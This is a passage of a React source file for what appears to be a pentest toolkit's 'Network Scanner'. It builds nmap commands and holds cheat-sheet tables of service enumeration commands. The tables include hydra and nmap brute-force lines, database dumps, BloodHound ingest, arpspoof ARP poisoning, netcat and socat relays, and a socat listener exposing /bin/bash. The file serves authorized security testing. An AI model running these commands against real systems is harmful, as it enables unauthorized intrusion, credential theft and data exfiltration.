audit.", "snmp-check 10.0.0.1 -c public"], ["onesixtyone", "Community brute.", "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.0.0.1"], ["braa", "Fast SNMP brute.", "braa public@10.0.0.1:.1.3.6.1.2.1.1"], ["nmap snmp-info", "SNMP system info.", "nmap -sU -p161 --script snmp-info 10.0.0.1"], ["nmap snmp-brute", "Community brute (NSE).", "nmap -sU -p161 --script snmp-brute 10.0.0.1"], ["snmpget sysDescr", "Single OID.", "snmpget -v2c -c public 10.0.0.1 1.3.6.1.2.1.1.1.0"], ["snmpbulkwalk", "Bulk walk.", "snmpbulkwalk -v2c -c public 10.0.0.1"], ["hydra snmp", "Brute SNMP creds.", "hydra -P pass.txt snmp://10.0.0.1"]]}, {"name": "LDAP", "rows": [["ldapsearch anon", "Anonymous base search.", "ldapsearch -x -H ldap://10.0.0.1 -b \"\" -s base"], ["ldapsearch users", "Search users (set base).", "ldapsearch -x -H ldap://10.0.0.1 -b \"dc=domain,dc=local\" \"(objectClass=user)\""], ["ldapdomaindump", "AD LDAP dump.", "ldapdomaindump ldap://10.0.0.1 -u domain\\\\user -p pass"], ["windapsearch", "Windows AD LDAP enum.", "windapsearch --dc-ip 10.0.0.1 -u user -p pass --users"], ["nmap ldap-search", "NSE LDAP queries.", "nmap --script ldap-search -p389 10.0.0.1"], ["nmap ldap-rootdse", "RootDSE info.", "nmap --script ldap-rootdse -p389 10.0.0.1"], ["ldapsearch groups", "List groups.", "ldapsearch -x -H ldap://10.0.0.1 -b \"dc=x,dc=y\" \"(objectClass=group)\""], ["ldaps", "LDAP over TLS.", "ldapsearch -x -H ldaps://10.0.0.1"], ["bloodhound.py", "BloodHound ingest (creds).", "bloodhound-python -u user -p pass -d domain.local -ns 10.0.0.1 -c all"], ["enum4linux -l", "LDAP via enum4linux.", "enum4linux -l 10.0.0.1"]]}, {"name": "MySQL", "rows": [["mysql client", "Interactive login.", "mysql -h 10.0.0.1 -u root -p"], ["nmap mysql-info", "Version / variables.", "nmap --script mysql-info -p3306 10.0.0.1"], ["nmap mysql-empty-password", "Empty password check.", "nmap --script mysql-empty-password -p3306 10.0.0.1"], ["nmap mysql-users", "Enumerate users (auth).", "nmap --script mysql-users --script-args mysqluser=root,mysqlpass= -p3306 10.0.0.1"], ["hydra mysql", "Brute MySQL.", "hydra -l root -P pass.txt mysql://10.0.0.1"], ["mysqlshow", "List databases.", "mysqlshow -h 10.0.0.1 -u root -p"], ["mysqldump", "Dump DB (perms).", "mysqldump -h 10.0.0.1 -u root -p --all-databases"], ["searchsploit mysql", "Exploit-db match.", "searchsploit mysql 5.7"], ["msf mysql_version", "Version scanner.", "msfconsole -q -x \"use auxiliary/scanner/mysql/mysql_version; set RHOSTS 10.0.0.1; run\""], ["tshark", "Capture MySQL on wire.", "tshark -i eth0 -f \"tcp port 3306\""]]}, {"name": "MSSQL", "rows": [["mssqlclient", "SQL shell (impacket).", "mssqlclient.py domain/user:pass@10.0.0.1"], ["sqsh", "Interactive SQL.", "sqsh -S 10.0.0.1 -U sa -P pass"], ["nmap ms-sql-info", "MSSQL info.", "nmap --script ms-sql-info -p1433 10.0.0.1"], ["nmap ms-sql-empty-password", "Sa empty password.", "nmap --script ms-sql-empty-password -p1433 10.0.0.1"], ["nmap ms-sql-brute", "Brute MSSQL.", "nmap --script ms-sql-brute -p1433 10.0.0.1"], ["hydra mssql", "Hydra brute.", "hydra -l sa -P pass.txt mssql://10.0.0.1"], ["msf mssql_login", "MSF login scanner.", "msfconsole -q -x \"use auxiliary/scanner/mssql/mssql_login; set RHOSTS 10.0.0.1; run\""], ["sqlcmd", "Microsoft CLI.", "sqlcmd -S 10.0.0.1 -U sa -P pass -Q \"SELECT @@version\""], ["mssqlinstance", "Instance enum (impacket).", "mssqlinstance.py 10.0.0.1"], ["nmap ms-sql-config", "Retrieve config (auth).", "nmap --script ms-sql-config --script-args mssql.username=sa,mssql.password=pass -p1433 10.0.0.1"]]}, {"name": "PostgreSQL", "rows": [["psql", "Interactive client.", "psql -h 10.0.0.1 -U postgres"], ["nmap pgsql-brute", "Brute postgres.", "nmap --script pgsql-brute -p5432 10.0.0.1"], ["hydra postgres", "Hydra brute.", "hydra -l postgres -P pass.txt postgres://10.0.0.1"], ["pg_dump", "Dump database.", "pg_dump -h 10.0.0.1 -U postgres dbname"], ["psql -l", "List databases.", "psql -h 10.0.0.1 -U postgres -l"], ["searchsploit postgresql", "Exploit-db match.", "searchsploit postgresql"], ["msf postgres_version", "Version scan.", "msfconsole -q -x \"use auxiliary/scanner/postgres/postgres_version; set RHOSTS 10.0.0.1; run\""], ["COPY FROM PROGRAM", "Dangerous feature (authorized).", "psql -h 10.0.0.1 -U postgres -c \"SELECT 1\""], ["nmap pgsql-tables", "List tables (auth).", "nmap --script pgsql-tables --script-args pgsql.user=postgres,pgsql.pass= -p5432 10.0.0.1"], ["psql sslmode=require", "Force TLS.", "psql \"host=10.0.0.1 sslmode=require user=postgres\""]]}, {"name": "RDP", "rows": [["nmap rdp-enum-encryption", "RDP security settings.", "nmap --script rdp-enum-encryption -p3389 10.0.0.1"], ["nmap rdp-ntlm-info", "NTLM info leak.", "nmap --script rdp-ntlm-info -p3389 10.0.0.1"], ["xfreerdp", "Connect to desktop.", "xfreerdp /v:10.0.0.1 /u:user /p:pass"], ["rdesktop", "Legacy RDP client.", "rdesktop 10.0.0.1"], ["hydra rdp", "Brute RDP.", "hydra -l admin -P pass.txt rdp://10.0.0.1"]]}, {"name": "VNC", "rows": [["nmap vnc-info", "VNC fingerprint.", "nmap --script vnc-info -p5900 10.0.0.1"], ["vncviewer", "Connect to VNC.", "vncviewer 10.0.0.1:5900"], ["hydra vnc", "Brute VNC password.", "hydra -P pass.txt -s 5900 10.0.0.1 vnc"], ["searchsploit vnc", "Exploit-db match.", "searchsploit vnc"], ["nmap realvnc-auth-bypass", "Historical check.", "nmap -p5900 --script realvnc-auth-bypass 10.0.0.1"]]}, {"name": "WinRM", "rows": [["evil-winrm", "PowerShell over WinRM.", "evil-winrm -i 10.0.0.1 -u user -p pass"], ["crackmapexec winrm", "Test auth / command.", "crackmapexec winrm 10.0.0.1 -u user -p pass"], ["nmap winrm-enum-users", "Enumerate users.", "nmap --script winrm-enum-users -p5985 10.0.0.1"], ["nmap http-title", "WinRM HTTP probe.", "nmap -p5985,5986 --script http-title 10.0.0.1"], ["msf winrm_login", "Brute WinRM.", "msfconsole -q -x \"use auxiliary/scanner/winrm/winrm_login; set RHOSTS 10.0.0.1; run\""]]}, {"name": "Redis", "rows": [["redis-cli", "Interactive Redis.", "redis-cli -h 10.0.0.1"], ["redis-cli INFO", "Server info.", "redis-cli -h 10.0.0.1 INFO"], ["nmap redis-info", "Redis NSE info.", "nmap --script redis-info -p6379 10.0.0.1"], ["nmap redis-brute", "Brute AUTH.", "nmap --script redis-brute -p6379 10.0.0.1"], ["SLAVEOF test", "Replication abuse (authorized).", "redis-cli -h 10.0.0.1 SLAVEOF host port"]]}, {"name": "MongoDB", "rows": [["mongosh", "Mongo shell.", "mongosh mongodb://10.0.0.1:27017"], ["nmap mongodb-databases", "List DBs (no auth).", "nmap --script mongodb-databases -p27017 10.0.0.1"], ["nmap mongodb-brute", "Brute credentials.", "nmap --script mongodb-brute -p27017 10.0.0.1"], ["mongoexport", "Export collection.", "mongoexport --uri mongodb://10.0.0.1/db -c col"], ["show collections", "List collections.", "mongosh --eval \"db.getCollectionNames()\" mongodb://10.0.0.1/test"]]}, {"name": "Memcached", "rows": [["nc stats", "Memcached stats.", "echo stats | nc 10.0.0.1 11211"], ["nmap memcached-info", "NSE memcached info.", "nmap --script memcached-info -p11211 10.0.0.1"], ["nmap UDP", "UDP memcached.", "nmap -sU -p11211 --script memcached-info 10.0.0.1"], ["stats items", "Slab stats one-liner.", "python3 -c \"import socket;s=socket.create_connection((\\\"10.0.0.1\\\",11211));s.send(b\\\"stats items\\\\r\\\\n\\\");print(s.recv(4096))\""], ["searchsploit memcached", "Exploit-db match.", "searchsploit memcached"]]}];
const NET_TOOLS = [{"title": "Netcat", "items": [["TCP listener", "Bind listener.", "nc -lvnp 4444"], ["UDP listener", "UDP listen.", "nc -u -lvnp 53"], ["reverse (attacker)", "Catch reverse shell.", "nc -lvnp 4444"], ["file send", "Push file.", "nc -lvnp 4444 < file.bin"], ["file recv", "Save file.", "nc ATTACKER 4444 > recv.bin"], ["port scan", "TCP connect range.", "nc -zv 10.0.0.1 20-30"], ["HTTP GET", "Manual request.", "printf \"GET / HTTP/1.0\\r\\n\\r\\n\" | nc 10.0.0.1 80"], ["relay fifo", "Two-way relay.", "mkfifo /tmp/f; nc -lvp 4444 < /tmp/f | nc 10.0.0.2 80 > /tmp/f"], ["simple proxy", "Forward to backend.", "nc -lvp 8080 -c \"nc 10.0.0.2 80\""], ["banner", "Read banner.", "echo | nc -vn 10.0.0.1 22"], ["ncat SSL", "TLS connect.", "ncat --ssl 10.0.0.1 443"], ["IPv6 listener", "Listen IPv6.", "nc -6 -lvnp 4444"], ["hex pipe", "Traffic to hex.", "nc -lvnp 4444 | xxd"], ["timeout", "Fail fast.", "nc -w 3 -zv 10.0.0.1 443"], ["keep -k", "GNU restart listener.", "nc -lk -vp 4444"]]}, {"title": "Socat", "items": [["reverse listener", "Catch shell.", "socat TCP-LISTEN:4444,reuseaddr,fork -"], ["OpenSSL server", "Encrypted listener.", "socat OPENSSL-LISTEN:4443,cert=server.pem,verify=0,fork STDIO"], ["OpenSSL client", "Encrypted client.", "socat OPENSSL:10.0.0.1:4443,verify=0 STDIO"], ["TCP forward", "Local port to remote.", "socat TCP-LISTEN:8080,fork TCP:10.0.0.2:80"], ["UDP to TCP", "Protocol bridge.", "socat UDP4-LISTEN:53,fork TCP:127.0.0.1:5353"], ["SOCKS4", "Simple SOCKS.", "socat TCP-LISTEN:1080,fork SOCKS4:127.0.0.1:10.0.0.1:22"], ["PTY bash", "Stable TTY shell.", "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"], ["file send", "Send file.", "socat TCP-LISTEN:4444,fork FILE:secret.bin"], ["file recv", "Receive file.", "socat TCP:10.0.0.1:4444 FILE:out.bin,create"], ["double relay", "Bridge two ports.", "socat TCP-LISTEN:1111,fork TCP:10.0.0.2:2222"]]}, {"title": "Tcpdump filters", "items": [["host", "Traffic involving host.", "tcpdump -i eth0 host 10.0.0.1"], ["src/dst host", "Directional.", "tcpdump -i eth0 src host 10.0.0.1 and dst host 10.0.0.2"], ["port", "TCP/UDP port.", "tcpdump -i eth0 port 80"], ["portrange", "Range.", "tcpdump -i eth0 portrange 1-1024"], ["tcp", "TCP only.", "tcpdump -i eth0 tcp"], ["udp", "UDP only.", "tcpdump -i eth0 udp"], ["icmp", "ICMP.", "tcpdump -i eth0 icmp"], ["SYN", "TCP SYN.", "tcpdump -i eth0 \"tcp[tcpflags] & tcp-syn != 0\""], ["RST/FIN", "Tear-down.", "tcpdump -i eth0 \"tcp[tcpflags] & (tcp-rst|tcp-fin) != 0\""], ["DNS", "Port 53.", "tcpdump -i eth0 port 53"], ["HTTP payload", "Cleartext HTTP.", "tcpdump -i eth0 -A tcp port 80"], ["large packets", "Jumbo hints.", "tcpdump -i eth0 greater 1400"], ["write pcap", "Save capture.", "tcpdump -i eth0 -w capture.pcap"], ["read pcap", "Read file.", "tcpdump -r capture.pcap"], ["verbose", "More decode.", "tcpdump -i eth0 -vv host 10.0.0.1"]]}, {"title": "Wireshark display filters", "items": [["http", "Cleartext HTTP.", "http"], ["http.host", "Host header contains.", "http.host contains \"example\""], ["dns", "DNS protocol.", "dns"], ["dns.qry.name", "Query name.", "dns.qry.name contains \"internal\""], ["tcp.stream", "One conversation.", "tcp.stream eq 0"], ["tls.handshake", "ClientHello.", "tls.handshake.type == 1"], ["smb", "SMB / SMB2.", "smb || smb2"], ["kerberos", "Kerberos.", "kerberos"], ["ftp", "FTP.", "ftp"], ["smtp", "SMTP.", "smtp"], ["telnet", "Telnet.", "telnet"], ["arp", "ARP.", "arp"], ["icmp", "ICMP.", "icmp"], ["frame contains", "ASCII hunt (lab).", "frame contains \"password\""], ["http.authorization", "Basic auth header.", "http.authorization"]]}, {"title": "ARP tools", "items": [["arp-scan local", "Discover LAN.", "sudo arp-scan --localnet"], ["arp-scan CIDR", "Scan subnet.", "sudo arp-scan 192.168.1.0/24"], ["arping", "IP to MAC.", "sudo arping -I eth0 -c 3 192.168.1.1"], ["arpspoof", "ARP poison (lab).", "sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.254"], ["ip neigh", "Neighbor table.", "ip neigh show"]]}, {"title": "Network recon", "items": [["traceroute", "Classic trace.", "traceroute 8.8.8.8"], ["nmap traceroute", "TCP trace.", "nmap --traceroute -Pn -p80 10.0.0.1"], ["mtr", "Live path stats.", "mtr -rwzc 100 8.8.8.8"], ["fping", "Fast ping sweep.", "fping -a -g 192.168.1.0/24"], ["bash ping sweep", "Simple /24.", "for i in {1..254}; do ping -c1 -W1 192.168.1.$i | grep bytes & done"], ["nmap -sn", "Live hosts.", "nmap -sn 192.168.1.0/24"]]}];
const QUICK_SCANS = [["Quick TCP", "Default scripts + versions to file.", "nmap -sC -sV -oN scan.txt TARGET"], ["Full TCP", "All TCP ports with scripts + versions.", "nmap -p- -sC -sV -oN full.txt TARGET"], ["UDP Top 100", "Top 100 UDP ports.", "nmap -sU --top-ports 100 -oN udp.txt TARGET"], ["Stealth", "SYN slow + frag + data padding.", "nmap -sS -T2 -f --data-length 24 TARGET"], ["Vuln Scan", "NSE vuln category.", "nmap --script=vuln TARGET"], ["All-in-One", "Aggressive full-feature all TCP.", "nmap -sC -sV -O -A -p- TARGET"], ["Web Enum", "Web ports + http-enum.", "nmap -sV -p 80,443,8080,8443 --script=http-enum TARGET"], ["SMB Enum", "SMB scripts wildcard.", "nmap -p 445 --script=smb-enum* TARGET"], ["Script Scan", "Default + safe scripts.", "nmap -sC -sV --script=default,safe TARGET"], ["Aggressive", "OS + traceroute + fast all ports.", "nmap -A -T4 -p- TARGET"]];

export default function NetworkScanner() {
  const { vars, setVar, substitute } = useVariables();
  const [tab, setTab] = useState('scanner');
  const [target, setTarget] = useState('');
  const [customRange, setCustomRange] = useState('1-1024');
  const [preset, setPreset] = useState('custom');
  const [scanType, setScanType] = useState('connect');
  const [generated, setGenerated] = useState('');
  const [portSearch, setPortSearch] = useState('');
  const [quickTarget, setQuickTarget] = useState('');

  const portSpec = useMemo(() => buildPortArg(preset, customRange), [preset, customRange]);
  const filteredPorts = useMemo(() => {
    const q = portSearch.trim().toLowerCase();
    return PORT_TABLE.filter((row) => {
      if (!q) return true;
      const [port, svc, desc] = row;
      return (
        String(port).includes(q)
        || String(svc).toLowerCase().includes(q)
        || String(desc).toLowerCase().includes(q)
      );
    });
  }, [portSearch]);

  const handleGenerate = () => {
    setGenerated(buildNmapCommand(target, scanType, portSpec));
  };

  const replaceQuick = (cmd) => cmd.replace(/TARGET/g, (quickTarget || '').trim() || 'TARGET');

  return (
    <div
      style={{
        minHeight: '100%',
        background: `linear-gradient(165deg, ${bgPage} 0%, #0f1318 55%, #0a0d11 100%)`,
        color: textMain,
        padding: '24px 20px 48px',
        fontFamily: heading,
      }}
    >
      <header style={{ maxWidth: 1200, margin: '0 auto 24px' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 14, marginBottom: 20 }}>
          <div
            style={{
              width: 36,
              height: 36,
              borderRadius: 10,
              background: headerIconBg,
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              boxShadow: '0 4px 14px rgba(56,189,248,0.25)',
            }}
          >
            <Network size={20} color="#0f172a" strokeWidth={2.2} />
          </div>
          <h1
            style={{
              margin: 0,
              fontFamily: heading,
              fontSize: 22,
              fontWeight: 700,
              letterSpacing: '-0.02em',
            }}
          >
            Network Scanner
          </h1>
          <ToolHelp title="Network Scanner" description="Nmap command builder and network reconnaissance reference. Build scan commands with presets." steps={["Enter the target IP or range","Select scan type and options","Copy the generated nmap command","Use the port reference to look up services"]} tips={["Presets cover common scan scenarios","The cheatsheet has advanced nmap techniques","Port reference includes 60+ well-known services"]} />
        </div>
        <nav
          style={{
            display: 'flex',
            flexWrap: 'wrap',
            gap: 8,
            padding: 6,
            background: bgPanel,
            borderRadius: 12,
            border: `1px solid ${border}`,
          }}
        >
          {TABS.map(({ id, label, Icon }) => (
            <button
              key={id}
              type="button"
              onClick={() => setTab(id)}
              style={{
                display: 'inline-flex',
                alignItems: 'center',
                gap: 8,
                padding: '10px 14px',
                borderRadius: 8,
                border: 'none',
                cursor: 'pointer',
                fontFamily: heading,
                fontSize: 13,
                fontWeight: 600,
                background: tab === id ? `${accent}18` : 'transparent',
                color: tab === id ? accent : textDim,
                boxShadow: tab === id ? `inset 0 0 0 1px ${accent}55` : 'none',
              }}
            >
              <Icon size={16} strokeWidth={2} />
              {label}
            </button>
          ))}
        </nav>
        <VariableBar vars={vars} setVar={setVar} fields={['LHOST', 'TARGET', 'LPORT', 'IFACE']} />
      </header>

      <main style={{ maxWidth: 1200, margin: '0 auto', display: 'flex', flexDirection: 'column', gap: 20 }}>
        {tab === 'scanner' && (
          <>
            <Card style={{ background: bgCard, border: `1px solid ${border}`, borderRadius: 10, padding: 20 }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 16 }}>
                <Target size={20} color={accent} />
                <h2 style={{ margin: 0, fontSize: 17, fontFamily: heading }}>Port Scanner</h2>
              </div>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(240px, 1fr))', gap: 16 }}>
                <div>
                  <label style={labelStyle()}>Target IP / hostname</label>
                  <input
                    style={inputStyle()}
                    placeholder="192.168.1.1 or scanme.nmap.org"
                    value={target}
                    onChange={(e) => setTarget(e.target.value)}
                  />
                </div>
                <div>
                  <label style={labelStyle()}>Port range (custom)</label>
                  <input
                    style={inputStyle()}
                    value={customRange}
                    onChange={(e) => { setCustomRange(e.target.value); setPreset('custom'); }}
                    disabled={preset !== 'custom'}
                  />
                </div>
                <div>
                  <label style={labelStyle()}>Scan type</label>
                  <select
                    value={scanType}
                    onChange={(e) => setScanType(e.target.value)}
                    style={{ ...inputStyle(), cursor: 'pointer' }}
                  >
                    <option value="connect" style={{ background: bgPage }}>TCP Connect</option>
                    <option value="syn" style={{ background: bgPage }}>SYN</option>
                    <option value="udp" style={{ background: bgPage }}>UDP</option>
                    <option value="service" style={{ background: bgPage }}>Service Detection</option>
                  </select>
                </div>
              </div>
              <div style={{ marginTop: 18 }}>
                <span style={labelStyle()}>Presets</span>
                <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8 }}>
                  {['top100:Top 100', 'top1000:Top 1000', 'full:Full', 'custom:Custom'].map((s) => {
                    const [id, label] = s.split(':');
                    return (
                      <button
                        key={id}
                        type="button"
                        onClick={() => setPreset(id)}
                        style={{
                          padding: '8px 14px',
                          borderRadius: 8,
                          border: `1px solid ${preset === id ? accent : border}`,
                          background: preset === id ? `${accent}14` : '#0f1419',
                          color: preset === id ? accent : textMain,
                          cursor: 'pointer',
                          fontFamily: mono,
                          fontSize: 12,
                        }}
                      >
                        {label}
                      </button>
                    );
                  })}
                </div>
              </div>
              <div style={{ marginTop: 18, display: 'flex', flexWrap: 'wrap', gap: 12, alignItems: 'center' }}>
                <button
                  type="button"
                  onClick={handleGenerate}
                  style={{
                    display: 'inline-flex',
                    alignItems: 'center',
                    gap: 8,
                    padding: '10px 18px',
                    borderRadius: 8,
                    border: `1px solid ${accent}`,
                    background: `${accent}20`,
                    color: accent,
                    cursor: 'pointer',
                    fontFamily: heading,
                    fontSize: 14,
                    fontWeight: 700,
                  }}
                >
                  <Scan size={18} />
                  Generate Command
                </button>
                <span style={{ fontFamily: mono, fontSize: 12, color: textDim }}>
                  Ports: <span style={{ color: accent }}>{portSpec.label}</span>
                </span>
              </div>
              {generated && (
                <div style={{ marginTop: 16, padding: 14, borderRadius: 10, background: '#0f1419', border: `1px solid ${border}`, display: 'flex', alignItems: 'flex-start', gap: 12 }}>
                  <code style={{ flex: 1, fontFamily: mono, fontSize: 12, wordBreak: 'break-all', lineHeight: 1.5 }}>{substitute(generated)}</code>
                  <CopyButton text={substitute(generated)} />
                </div>
              )}
            </Card>
            <Card style={{ background: bgCard, border: `1px solid ${border}`, borderRadius: 10, padding: 20 }}>
              <div style={{ display: 'flex', flexWrap: 'wrap', gap: 12, marginBottom: 14, alignItems: 'center' }}>
                <ListOrdered size={20} color={accent} />
                <h2 style={{ margin: 0, fontSize: 17 }}>Common ports reference</h2>
                <div style={{ flex: '1 1 200px', minWidth: 180 }}>
                  <input style={inputStyle()} placeholder="Search…" value={portSearch} onChange={(e) => setPortSearch(e.target.value)} />
                </div>
              </div>
              <div style={{ borderRadius: 10, border: `1px solid ${border}`, overflow: 'auto', maxHeight: '52vh', background: bgPanel }}>
                <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 12 }}>
                  <thead>
                    <tr style={{ position: 'sticky', top: 0, background: bgPage, zIndex: 1 }}>
                      {['Port', 'Service', 'Description'].map((h) => (
                        <th key={h} style={{ textAlign: 'left', padding: '11px 12px', borderBottom: `2px solid ${accent}44`, color: accent, fontFamily: heading, fontSize: 11, textTransform: 'uppercase', letterSpacing: '0.06em' }}>{h}</th>
                      ))}
                    </tr>
                  </thead>
                  <tbody>
                    {filteredPorts.map((row) => {
                      const [port, service, desc] = row;
                      return (
                        <tr key={`${port}-${service}`} style={{ borderBottom: `1px solid ${border}` }}>
                          <td style={{ padding: '10px 12px', fontFamily: mono, color: accent, fontWeight: 600 }}>{port}</td>
                          <td style={{ padding: '10px 12px', fontFamily: mono }}>{service}</td>
                          <td style={{ padding: '10px 12px', color: textDim, lineHeight: 1.45 }}>{desc}</td>
                        </tr>
                      );
                    })}
                  </tbody>
                </table>
                {filteredPorts.length === 0 && <p style={{ padding: 20, textAlign: 'center', color: textDim }}>No matches.</p>}
              </div>
              <p style={{ margin: '12px 0 0', fontSize: 11, color: textDim }}>
                {filteredPorts.length} / {PORT_TABLE.length} — authorized use only.
              </p>
            </Card>
          </>
        )}

        {tab === 'cheat' && (
          <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
            {NMAP_SECTIONS.map((section) => (
              <Card key={section.title} style={{ background: bgCard, border: `1px solid ${border}`, borderRadius: 10, padding: 0, overflow: 'hidden' }}>
                <div style={{ padding: '14px 18px', background: `linear-gradient(90deg, ${accent}14, transparent)`, borderBottom: `1px solid ${border}`, fontFamily: heading, fontWeight: 700, fontSize: 15, color: accent }}>{section.title}</div>
                <div style={{ padding: 4 }}>
                  {section.items.map((item) => (
                    <div key={`${section.title}-${item.cmd}`} style={{ padding: '12px 14px', borderBottom: `1px solid ${border}`, display: 'grid', gridTemplateColumns: 'minmax(100px, 200px) 1fr auto', gap: 12, alignItems: 'start' }}>
                      <code style={{ fontFamily: mono, fontSize: 11, color: accent, wordBreak: 'break-all' }}>{item.cmd}</code>
                      <div>
                        <p style={{ margin: 0, fontSize: 13, lineHeight: 1.45 }}>{item.desc}</p>
                        <code style={{ display: 'block', marginTop: 8, fontFamily: mono, fontSize: 11, color: textDim, wordBreak: 'break-all', lineHeight: 1.45 }}>{substitute(item.ex)}</code>
                      </div>
                      <CopyButton text={substitute(item.ex)} />
                    </div>
                  ))}
                </div>
              </Card>
            ))}
          </div>
        )}

        {tab === 'enum' && (
          <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
            {SERVICE_ENUM.map((block) => (
              <Card key={block.name} style={{ background: bgCard, border: `1px solid ${border}`, borderRadius: 10, padding: 18 }}>
                <h3 style={{ margin: '0 0 14px', fontSize: 16, color: accent, fontFamily: heading }}>{block.name}</h3>
                {block.rows.map((row) => {
                  const [title, desc, cmd] = row;
                  return (
                    <div key={`${block.name}-${title}`} style={{ display: 'grid', gridTemplateColumns: 'minmax(120px, 200px) 1fr auto', gap: 12, padding: '12px 0', borderBottom: `1px solid ${border}`, alignItems: 'start' }}>
                      <div>
                        <div style={{ fontFamily: heading, fontSize: 12, fontWeight: 600 }}>{title}</div>
                        <div style={{ fontSize: 12, color: textDim, marginTop: 4, lineHeight: 1.4 }}>{desc}</div>
                      </div>
                      <code style={{ fontFamily: mono, fontSize: 11, wordBreak: 'break-all', lineHeight: 1.45 }}>{substitute(cmd)}</code>
                      <CopyButton text={substitute(cmd)} />
                    </div>
                  );
                })}
              </Card>
            ))}
          </div>
        )}

        {tab === 'tools' && (
          <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
            {NET_TOOLS.map((sec) => (
              <Card key={sec.title} style={{ background: bgCard, border: `1px solid ${border}`, borderRadius: 10, padding: 18 }}>
                <h3 style={{ margin: '0 0 14px', fontSize: 16, color: accent, fontFamily: heading }}>{sec.title}</h3>
                {sec.items.map((row) => {
                  const [title, desc, cmd] = row;
                  return (
                    <div key={`${sec.title}-${title}`} style={{ display: 'grid', gridTemplateColumns: 'minmax(100px, 160px) 1fr auto', gap: 12, padding: '12px 0', borderBottom: `1px solid ${border}`, alignItems: 'start' }}>
                      <div>
                        <div style={{ fontFamily: heading, fontSize: 12, fontWeight: 600 }}>{title}</div>
                        <div style={{ fontSize: 12, color: textDim, marginTop: 4 }}>{desc}</div>
                      </div>
                      <code style={{ fontFamily: mono, fontSize: 11, wordBreak: 'break-all', lineHeight: 1.45 }}>{substitute(cmd)}</code>
                      <CopyButton text={substitute(cmd)} />
                    </div>
                  );
                })}
              </Card>
            ))}
          </div>
        )}

        {tab === 'quick' && (
          <>
            <Card style={{ background: bgCard, border: `1px solid ${border}`, borderRadius: 10, padding: 18 }}>
              <label style={labelStyle()}><Terminal size={14} style={{ verticalAlign: 'middle', marginRight: 6 }} />Replace TARGET</label>
              <input style={inputStyle()} placeholder="scanme.nmap.org" value={quickTarget} onChange={(e) => setQuickTarget(e.target.value)} />
            </Card>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(300px, 1fr))', gap: 16 }}>
              {QUICK_SCANS.map(([name, desc, cmd]) => {
                const filled = replaceQuick(cmd);
                return (
                  <Card key={name} style={{ background: bgCard, border: `1px solid ${border}`, borderRadius: 10, padding: 18, display: 'flex', flexDirection: 'column', gap: 10 }}>
                    <h3 style={{ margin: 0, fontSize: 16, color: accent, fontFamily: heading }}>{name}</h3>
                    <p style={{ margin: 0, fontSize: 13, color: textDim, lineHeight: 1.45 }}>{desc}</p>
                    <div style={{ padding: 12, borderRadius: 8, background: '#0f1419', border: `1px solid ${border}`, display: 'flex', gap: 10, alignItems: 'flex-start' }}>
                      <code style={{ flex: 1, fontFamily: mono, fontSize: 11, wordBreak: 'break-all', lineHeight: 1.5 }}>{substitute(filled)}</code>
                      <CopyButton text={substitute(filled)} />
                    </div>
                  </Card>
                );
              })}
            </div>
          </>
        )}
      </main>

      <footer style={{ maxWidth: 1200, margin: '28px auto 0', fontSize: 11, color: textDim, lineHeight: 1.5 }}>
        <Layers size={14} style={{ verticalAlign: 'middle', marginRight: 6, color: accent }} />
        Authorized testing only. Copy commands into a real terminal — the webview cannot open raw sockets.
      </footer>
    </div>
  );
}
